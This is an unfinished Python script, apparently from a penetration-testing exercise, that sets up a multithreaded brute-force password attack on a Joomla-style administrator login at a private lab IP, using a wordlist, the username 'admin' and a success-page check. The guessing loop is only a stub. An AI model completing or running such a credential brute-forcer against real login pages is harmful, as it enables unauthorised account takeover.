import urllib
# import cookielib
import threading
import sys

from queue import Queue
from bs4 import BeautifulSoup
from http import cookiejar

# general settings
user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

# target specific settings
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field= "username"
password_field= "passwd"

success_check = "Administration - Control Panel"


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            pass





